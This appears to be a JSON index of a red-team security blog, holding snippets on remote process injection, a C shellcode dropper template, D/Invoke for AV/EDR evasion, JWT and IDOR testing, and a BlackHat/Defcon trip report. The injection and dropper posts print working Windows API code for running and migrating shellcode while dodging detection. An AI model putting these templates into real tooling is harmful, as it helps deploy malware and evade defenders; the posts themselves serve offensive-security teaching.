[ { "title": "Remote Process Injection", "url": "/posts/Process_Injection/", "categories": "blog", "tags": "code_execution", "date": "2023-03-14 19:00:00 +0200", "snippet": "What is process injection and why do we need it?Process injection is the act of creating a copy of your shellcode in the current process and copying it across to the memory space of a different process and remotely executing that code.There are mulitiple ways of getting initial access during a Red Team campaign, but, through whichever means you get a successful beacon out to your control server, your first call home will be short lived most of the time. If you use phishing or a Trojan for instance, you would want to migrate your beacon code to a more stable long term process that will not die when the victim closes the application. Process injection can also be helpful if you are concerned about OPSEC. Migrating your code/beacon over to a web browser process will blend in much better than calc connecting out to the internet.Implementing Process InjectionProcess injection involves much of the same steps as we have already discussed in this post. We will make use of 3 Windows APIs that were designed for debugging processes, namely VIrtualAllocEx, WriteProcessMemory and CreateRemoteThread. You might recognise these APIs and that is because it is the same APIs we used during the dropper design phase, but only for use in remote processes.We start off with assigning variables for our shellcode buffer and the remote thread we will execute that shellcode with. Using VIrtualAllocEx, we can assign a buffer for our shellcode in a remote process and speicify the size of the buffer and what memory protections should be applied (RX).LPVOID pRemoteCode = NULL;HANDLE hThread = NULL;pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);After the buffer has been assigned, we can use WriteProcessMemory to “copy” our shellcode from our current process to the remote process identified in the previous step.WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);Now that our shellcode has been copied into the memory space of the remote process, we just need a way to trigger the execution of that code. We can use the CreateRemoteThread API and specify the remote process and pointer to the code buffer we want executed.hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);if (hThread != NULL) { WaitForSingleObject(hThread, 500); CloseHandle(hThread); return 0; } return -1;The technique above is the classic way of accomplishing code injection and in future posts we will discuss some variations we can use to achieve the same result." }, { "title": "Testing JWTs", "url": "/posts/JWT/", "categories": "blog", "tags": "tokens, jwt", "date": "2023-03-06 19:00:00 +0200", "snippet": "Pentesting JSON Web Tokens (JWT)JSON Web Tokens (JWTs) are a popular method for implementing authentication and authorization in modern web applications. JWTs are compact and self-contained, making them easy to use and transmit as a URL parameter, cookie value, or in the HTTP Authorization header. However, like any other security mechanism, JWTs can be vulnerable to attacks if not implemented correctly.What are JWT Tokens?Before we begin, let’s quickly review what a JWT token is. A JWT token is made up of three parts: the header, the payload, and the signature. The header contains information about the token’s type and algorithm, the payload contains the user’s claims, such as their ID and role, and the signature is a hash of the header, payload, and a secret key. The header and payload are base64 encoded JSON strings, and the signature is a hash of the header, payload, and a secret key.In this blog post, we will focus on how to pentest JWT tokens, with a particular focus on their expiry, editing Roles within payloads, and refresh tokens.Testing ExpiryOne of the essential features of JWT tokens is their expiry. Expiry ensures that the token is valid only for a limited time, and after that, the user has to log in again. If the expiry time is not set correctly, it may lead to unauthorized access or session hijacking.To test the expiry of JWT tokens, we can use Burp Suite’s Intruder feature. We can send multiple requests to the server with different JWT tokens and observe the server’s response. If the server accepts an expired token, it means that the expiry is not implemented correctly. We can also use the JWT.io website to decode the token and check the expiry claim.Editing Roles within the PayloadOne of the common vulnerabilities in JWT tokens is the ability to edit the user’s role within the payload. If a user can edit their role, they may gain unauthorized access to restricted areas or perform actions they should not be able to perform.To test the ability to edit roles within the payload, we can use Burp Suite’s Repeater feature. First, we need to obtain a valid JWT token and copy it to the clipboard. Next, we create a new request in Burp Suite’s Repeater and paste the token into the appropriate field. Then, we use the Decoder feature to decode the payload and identify the user’s role. We can then modify the role’s value to a higher privileged role, such as an admin, and encode the payload back to base64. Finally, we send the modified request and observe the server’s response. If the server accepts the modified token, it means that the ability to edit roles within the payload is not implemented correctly.Testing Refresh TokensRefresh tokens are long-lived tokens used to obtain new access tokens after the expiry of the previous one. Refresh tokens are used to provide a seamless user experience and avoid frequent logins. However, if refresh tokens are not implemented correctly, they may lead to session fixation attacks.To test refresh tokens, we can use Burp Suite’s Repeater feature. First, we obtain a valid refresh token and copy it to the clipboard. Next, we create a new request in Burp Suite’s Repeater and paste the refresh token into the appropriate field. Finally, we modify the token’s expiry time and send the request. If the server accepts the modified token, it means that the refresh token is not implemented correctly.ConclusionJWTs can be vulnerable to attacks if not implemented correctly.References:https://portswigger.net/web-security/oauthPost written by: Coppertop" }, { "title": "Creating a Dropper in C", "url": "/posts/Windows_Dropper/", "categories": "blog", "tags": "code_execution", "date": "2023-02-19 19:00:00 +0200", "snippet": "In this post we will take a very high level approach to creating a dropper for Windows. The structure of the dropper can take the form of 3 templates, each using a different structure of the portable executable to execute your shellcode. A dropper is just an application/binary/PE that delivers and executes your payload/Shellcode on the target system.What is a Portable Executable (PE)a PE is a Way of structuring a file on disk so that the Windows loader recognizes the file as executable code and loads it into memory. If you want to have a detailed look at the structure of a PE, here you go. The two main structures we will be looking at will be Headers and Sections.Headers is just metadata about the PE. The below image shows the information contained in the headers for notepad.exe.Sections actually contain the executable code for a PE. The below image shows the sections contained in notepad.exe. These sections will become important later on when choosing where to store your payload.What is the difference between an EXE and a DLLTwo of the main PEs offensive operators can/will make use of is .exe(s) and .dll(s). The main difference between the two is that an EXE is a self-contained structure and completely independant in memory. The EXE will create a new process in windows and can interact with other processes, load different libraries and use all the different Win32/NT APIs. a DLL on the other hand is just a library that is called by an already in-memory process and usually needs a function inside the library that is called by the process.Sections for use in offensive tradecraftThe 3 sections that we can make use of for our payload/shellcode are the .data (Data), .text (Text) and .rsrc (Resources) sections. Each section that you choose for your payload will require a different layout in our C program. We will discuss the differences, but let’s create the template for our first dropper program and then look at the distinguising features of our program and it’s corresponding section. For any shellcode execution, there needs to be 4 essential functions within your program (There are different ways of doing this within the offensive community, but that is a post/posts for another day).Firstly, we want to reserve space in memory for our code and that can be accomplished by using the VirtualAlloc API. We allocate the memory space and also tell Windows what protections to apply (Read and Write) to the memory space flProtect (very important for detection considerations).VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)Secondly, we want to copy our payload (assigned to a variable in our template) into the newly reserved memory space with the RtlMoveMemory API.RtlMoveMemory(VOID *Destination, VOID *Source, SIZE_T Length);Thirdly, we change the protection on the assigned memory region to make it executable (Read, Write, Execute) by using the VirtualProtect API. Changing the memory protection after assignment is slightly less suspicious for AV/EDR tools.VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);Lastly we make use of the CreateThread API to execute our code in a new thread within the process.Our template for our dropper should now look like this:unsigned char payload[] = {SHELLCODE};unsigned int payload_length = SHELLCODE_LENGTH;int main(void) {// Reserve space in memory for our payloadme_reserve = VirtualAlloc(0, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);// Move the payload to the newly reserved space.RtlMoveMemory(me_reserve, payload, payload_length);\t// Change the memory protection to add execute permissionsmem_protect = VirtualProtect(me_reserve, payload_length, PAGE_EXECUTE_READ, &amp;oldprotect);// run the payloadif ( mem_protect != 0 ) {\texec = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) me_reserve, 0, 0, 0);\tWaitForSingleObject(th, -1);}return 0;}The differences in the code comes in w.r.t to which section you would like to use for your payload.If you want to use the .text section, you need to assign your payload as a local variable. So within the main function of the application.If you want to use the .data section, you need to assign your payload as a global variable. So outside of the main function of the application.The use of the .rsrc section is slightly more complex: Store your payload in a resources file on disk - payload.rc You need an additional include in the application \"include resources.h\" The payload needs to be extracted from a file using the FindResource, LoadResource and LockResource APIs before continuing with the above template as normal You will need to use the Windows Resource Compiler to create an object file from your payload resources fileHopefully this post has clarified a couple of nuances for you and we will continue with this thread in future posts to look at some techniques to avoid getting detected by AV/EDR tools.Post written by: J33r4ff3" }, { "title": "Difference Between IDOR and Authorization Bypass", "url": "/posts/AuthbypassIDOR/", "categories": "blog", "tags": "auth_bypass, idor", "date": "2023-02-14 19:00:00 +0200", "snippet": "Understanding the Difference Between IDOR and Authorization BypassWhen it comes to web application security, it’s important to understand the various vulnerabilities that can be exploited by attackers to gain unauthorized access to sensitive information or perform malicious actions. Two common types of vulnerabilities that are often confused are Insecure Direct Object Reference (IDOR) and Authorization Bypass. In addition, there are two types of Authorization Bypass, Horizontal and Vertical Privilege Escalation, that can further complicate the issue.What is Insecure Direct Object Reference (IDOR)?Insecure Direct Object Reference (IDOR) is a vulnerability that occurs when an application exposes a reference to an internal object, such as a file, database record, or resource, in a way that allows an attacker to manipulate the reference to access unauthorized data or functionality.For example, imagine a web application that allows users to view and edit their personal information by navigating to a URL like https://example.com/profile/1234. In this case, the number 1234 is used to identify the user’s profile in the application’s database. If the application doesn’t properly check that the user is authorized to access that profile, an attacker could simply change the number in the URL to access the profile of a different user, or even a system administrator.Here are some steps to follow when testing for IDORs: Identify sensitive resources: Start by identifying any resources that contain sensitive data or perform privileged actions. Authenticate: Attempt to access the sensitive resource by authenticating using valid credentials. Test for direct object references: Test the application for direct object references by manipulating the parameters of requests. Look for any parameters that reference specific objects, such as user IDs or order IDs. Test for privilege escalation: Look for ways to escalate privileges by accessing sensitive information or performing actions that should only be available to privileged users. Automate testing: Use automated testing tools like Burp Suite to test for common IDOR vulnerabilities. Here is a Burp request example of an IDOR vulnerability:GET /order?id=123 HTTP/1.1Host: vulnerable-app.comCookie: sessionid=abcdef123456To exploit this vulnerability, the attacker could simply change the ID parameter to a different value, such as:GET /order?id=456 HTTP/1.1Host: vulnerable-app.comCookie: sessionid=abcdef123456What is Authorization Bypass?Authorization Bypass is a vulnerability that occurs when an attacker is able to perform actions that they should not have access to due to a failure in the web application’s access control mechanisms. The attacker can bypass the authorization checks and gain unauthorized access to sensitive data or perform privileged actions.There are two types of Authorization Bypass: Horizontal and Vertical Privilege Escalation.Horizontal Privilege Escalation occurs when an attacker is able to access resources or perform actions that are at the same level of privilege as the user they are impersonating. For example, if a user has access to a certain set of files, an attacker could use an Authorization Bypass vulnerability to access those same files, but not any others.Vertical Privilege Escalation occurs when an attacker is able to access resources or perform actions that are at a higher level of privilege than the user they are impersonating. For example, if a user has limited access to a certain set of files, an attacker could use an Authorization Bypass vulnerability to access files that only an administrator should be able to access.Here are some steps to follow when testing for Authorization Bypasses: Identify restricted resources: Start by identifying any resources that require authentication or authorization to access. This may include certain pages, directories, or API endpoints. Authenticate: Attempt to access the restricted resource by authenticating using valid credentials. Manipulate authentication: Manipulate the authentication mechanism to gain access to the restricted resource. This may include modifying session IDs, cookies, or other authentication parameters. Test for access control vulnerabilities: Test the application for common access control vulnerabilities, such as insecure direct object reference (IDOR), vertical and horizontal privilege escalation, parameter tampering, and business logic vulnerabilities. Test for privilege escalation: Look for ways to escalate privileges by accessing sensitive information or performing actions that should only be available to privileged users. Automate testing: Use automated testing tools like Burp Suite to test for common authorization bypass vulnerabilities. Example of Authorization BypassFor example, consider a web application that requires a user to be logged in to access certain resources. The application checks the user’s authentication status by validating a session ID parameter in the request. If the application does not validate this parameter properly, an attacker could manipulate the session ID parameter to gain access to the restricted resources.Burp Request Example of Authorization Bypass:GET /admin HTTP/1.1Host: example.comCookie: session_id=abcd1234In the above example, an attacker could manipulate the session ID parameter to access the administrative resources.ConclusionIn summary, while both authorization bypass and IDOR involve accessing or modifying data that should be restricted, authorization bypass is generally about circumventing authentication or authorization checks, whereas IDOR is about manipulating object references to access data that should be restricted.In conclusion, IDOR and Authorization Bypass are two common web application vulnerabilities that can lead to unauthorized access or manipulation of data. IDOR occurs when a web application fails to validate user input, allowing an attacker to access resources they should not have access to. Authorization Bypass occurs when an attacker is able to perform actions they should not have access to due to a failure in the web application’s access control mechanisms. It’s important to note that every application is different, so there is no single method that will work for all applications. However, the steps provided can be used as a starting point for testing for Authorization Bypasses and IDORs. In addition, testers should stay up-to-date with the latest techniques and tools for finding these vulnerabilities.References:https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schemahttps://portswigger.net/web-security/access-controlhttps://portswigger.net/web-security/access-control/idorPost written by: Coppertop" }, { "title": "Executing Unmanaged Code in Memory", "url": "/posts/ExecutingCode/", "categories": "blog", "tags": "code_execution", "date": "2023-02-08 19:00:00 +0200", "snippet": "Difference between P/Invoke &amp; D/InvokeWith the ever increasing effectiveness of detection tools on the Blue Team side, more sophisticated ways of executing unmanaged code is needed on the Red Team side. Powershell has long been a go-to for Red Teamers, but has also been heavily scrutinized by detective capabilities and, as such, much of the Offensive tradecraft has moved over to the flexibility that .NET provides. Two such mechanisms have gained popularity over the years and, in this post, I will attempt to explain the difference between the two mechanisms.P/Invoke - Platform InvokeP/Invoke allows .NET applications to access structs, callbacks, and functions in unmanaged libraries (DLLs). One of the main reasons that .NET has become popular with Offensive tool developers is that .NET assemblies are easy to load and execute from memory which means that as a Red Team Operator with initial access, there is no need to touch disk while executing advanced post-exploitation activities.Something to consider, i.t.o detection, when using P/Invoke:When a .NET assembly is loaded, the Import Address Table will be updated to include the memory addresses of the API calls and functions that are called by the assembly (Static Reference). For example, if you make use of P/Invoke to call CreateRemoteThread, then your executable’s import address table will include a static reference to that function. This is easy to view from a defensive perspective when analyzing the executable and will clearly show that you are making a malicious call to a remote process. Any endpoint security product monitoring API calls, through API Hooking, on the endpoint will catch any call made through P/Invoke. More advanced Endpoint Detection and Response tools may also easily block these malicious looking calls.D/Invoke - Dynamic InvokeD/Invoke contrasts the P/Invoke method by dynamically referencing the function addresses. The application has to manually look for the memory address of each function. This is accomplished by loading DLLs into memory manually through whatever mechanism the red team operator prefers. Once the DLL is loaded into memory, all that is left is to get a pointer to a function in the DLL and calling that function using the pointer.The actual .NET feature that allows this is called delegates. ‘Delegates are used to pass methods as arguments to other methods’. The Delegate API allows the wrapping of a method/function in a class. The distinctive feature of delegates is that they can be instantiated from a pointer to a function and dynamically invoking said function while passing in parameters.As an example, from the SharpSploit toolkit:public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters){ IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName); return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);}public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters){ Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType); return funcDelegate.DynamicInvoke(Parameters);}The second method is the core of the D/Invoke API. It creates a Delegate from a function pointer (funcDelegate) and invokes the function wrapped by the delegate (funcDelegate.DynamicInvoke), passing in your parameter (Parameters). The parameters are passed as an array of Objects (ref object[] Parameters) which provides the flexibility of passing data in any form needed. The only consideration is that the data needs to be structured in the way the unmanaged DLL expects it to be.The most difficult part to understand is the Type FunctionDelegateType parameter. This is where you pass in the function prototype of the unmanaged code that you want to call. The prototype is the instructions for the delegate on how to structure the the CPU registers and the memory stack when the function is invoked. Defining a delegate works in a similar manner. You can define a delegate similar to how you would define a variable. Optionally, you can specify what calling convention to use when calling the function wrapped by the delegate.Here is an example of a FunctionDelegateType for the NtCreateThreadEx API:[UnmanagedFunctionPointer(CallingConvention.StdCall)]public delegate Execute.Native.NTSTATUS NtCreateThreadEx( out IntPtr threadHandle, Execute.Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList); There is already a library of delegates and function wrappers for commonly used NT and Win32 APIs.Using this dynamic loading technique removes the detection considerations present with P/Invoke as there are no suspicious API calls in the IAT of your Assembly.In PractiseSharpSploit now has a DInvoke library in the SharpSploit.Execution.DynamicInvoke namespace. The DInvoke library provides a managed wrapper function for each unmanaged function. The wrapper helps the user by ensuring that parameters are passed in correctly and the correct type of object is returned.The code below demonstrates how DInvoke is used for the NtCreateThreadEx function in ntdll.dll. The delegate (that sets up the function prototype) is stored in the SharpSploit.Execution.DynamicInvoke.Native.DELEGATES struct. The wrapper method is SharpSploit.Execution.DynamicInvoke.Native.NtCreateThreadEx that takes all of the same parameters that you would expect to use in a normal PInvoke.namespace SharpSploit.Execution.DynamicInvoke{ /// &lt;summary&gt; /// Contains function prototypes and wrapper functions for dynamically invoking NT API Calls. /// &lt;/summary&gt; public class Native { public static Execute.Native.NTSTATUS NtCreateThreadEx( ref IntPtr threadHandle, Execute.Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList) { // Craft an array for the arguments object[] funcargs = { threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList }; Execute.Native.NTSTATUS retValue = (Execute.Native.NTSTATUS)Generic.DynamicAPIInvoke(@\"ntdll.dll\", @\"NtCreateThreadEx\", typeof(DELEGATES.NtCreateThreadEx), ref funcargs); // Update the modified variables threadHandle = (IntPtr)funcargs[0]; return retValue; } public struct DELEGATES { [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate Execute.Native.NTSTATUS NtCreateThreadEx( out IntPtr threadHandle, Execute.Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList); }Hopefully this clarified the difference between these popular techniques and what to keep in mind when using them.https://thewover.github.io/Dynamic-Invoke/https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvokehttps://github.com/cobbr/SharpSploitPost written by: J33r4ff3" }, { "title": "2023 Plans", "url": "/posts/Blog/", "categories": "updates", "tags": "plans", "date": "2023-01-09 19:00:00 +0200", "snippet": "2023 Plans on blogging and setting up weekly updates.Myself and another Cyber Security Specialist / Red Teamer will be posting weekly on several topics relating to Cyber Security. Some technical content, some abstract content and some “Experiences” content.The aim for us is to share knolage and learn ourselves in the process of doing these post. Post should be weekly going forward unless we are working on a bigger over all post, Leave or other reasons :) Blogs Learning Experiences2023Post written by: Coppertop" }, { "title": "BlackHat 2022", "url": "/posts/BH25D30/", "categories": "blog", "tags": "blackhat, defcon", "date": "2022-08-22 19:00:00 +0200", "snippet": "My BlackHat and Decfon 2022 experience.In 2022 I once again got the opportunity to attend BlackHat and Defcon. I managed to also attend a two day Applied Web Application Hacking training course presented by Sensepost / Orange Cyberdefense.Being the first real trip post covid there was a sense of nervousness when arriving at the airport… This quickly disappeared once we entered the lounge before our long-haul flights to have a couple of beers… 20+ hours of travel to get to the US.Blackhat 25Registration unfortunately only opened on the morning that training started. So this ended up causing a massive line-con and delayed the start of training by an hour or two.The Training:I chose to attend the two-day Applied Web Application Hacking that would include the following:Practical training: Essential theory Mostly hands-on practical web application hacking 25 practical’s, various levels of difficulty Fine line between challenge and not learning 2 days, 10+ practical’s a day Most of them will take between 15 and 30 minutesOverall I found the course material to be informative and to the point. It gives you a broad understating of basic pentest techniques that will give you a good base understanding of the OWASP testing process.Briefings and Business hall:Day one of briefings always seems jam-packed with excellent talks that always run at the same time… Two of my favourite briefings that I manged to attend were:Day one of briefings always seems jam-packed with excellent talks that always run at the same time… Two of my favourite briefings that I managed to attend were:Industroyer2: Sandworm’s Cyberwarfare Targets Ukraine’s Power Grid Again. Speakers: Robert Lipovsky, Anton Cherepanov“Industroyer2 – a new version of the only malware to ever trigger electricity blackouts – was deployed in Ukraine amidst the ongoing Russian invasion. Like in 2016 with the original Industroyer, the aim of this recent cyberattack was to cause a major blackout – this time against two million+ people and with components amplifying the impact, making recovery harder.”andBackdooring and Hijacking Azure AD Accounts by Abusing External IdentitiesSpeaker: Dirk-jan Mollema“External identities are a concept in Azure Active Directory which makes it possible to collaborate with users outside of an organization. These external users, often called guest users, can be granted permissions to certain resources and work together with users within the organization. The identities of these users are managed in a different Azure AD tenant, or are unmanaged accounts outside of Azure AD.This talk explained how these external identities work in Azure AD and how concepts such as B2B collaboration are facilitated. During the research for this talk, several flaws in the implementation were identified, which create novel ways to backdoor and hijack Azure AD accounts from a regular user. There were also ways identified to exploit these external identity links to elevate privileges, bypass Multi Factor Authentication and Conditional Access policies. All these attacks were possible in the default configuration of Azure AD.”The business hall was quite underwhelming this year. There were still loads of looting to be done but the gatekeepers of the swag made you work for it. Sitting down to listen to product demos, speaking to a rep for 20 minutes for a t-shirt etc.Trend Micro presented an Arsenal talk around red teaming with the option of some hands-on keyboard action. This was definitely one of my highlights of the few days of BH. We managed to crack more than half of the challenges and were second on the leaderboard. A well-deserved t-shirt and coin :-)Defcon 30With jetlag starting to hit quite hard the weird and wonderful Defcon 30 was upon us. After more time than I am willing to admit we finally found the Ceasars Forum… The l33t hackers turned out in their thousands with hardly any space to move. This made navigating the halls a massive chore.Myself and Synthet1c proceeded to roam through all the villages with the end goal being to enter a CTF. $10 beers were bought and an empty table was found where we could setup and start hacking.After what seemed like hours of setup we finally started getting points on the board and managed to walk away at the end of day one in the top 5. We walked back to our hotel leaving the still crowded halls to buy food and beers to keep us fuelled for the evenings hacking. This was probably one of the highlights of the trip. Sitting in a Vegas hotel room, music going, “oh I managed to crack this one… Come see how I did it” and a few drinks.The next day was more of the same at Defcon. Busy busy busy. We managed to buy some swag on day two and mission around to all the villages again. We built paper planes, a tinfoil hat and watched some of the smartest hacking teams in the world compete in the main Defcon CTF.On the last day needless to say we took things easy and met up with a few guys from SA. We discussed Security things and just caught up on the craziness that was BH and Defcon. We did one last pass of the main CTF and found a random mini plastic mushroom that we still don’t know what or why it was where it was ¯_(ツ)_/¯.Thanks for taking the time to read my experience.Here is a few photos from BlackHat 25 and Defcon 30#LineconBlackHat 25 KeynoteRapid7 PartyVendor Party at the top of DelanoPost written by: Coppertop" } ]
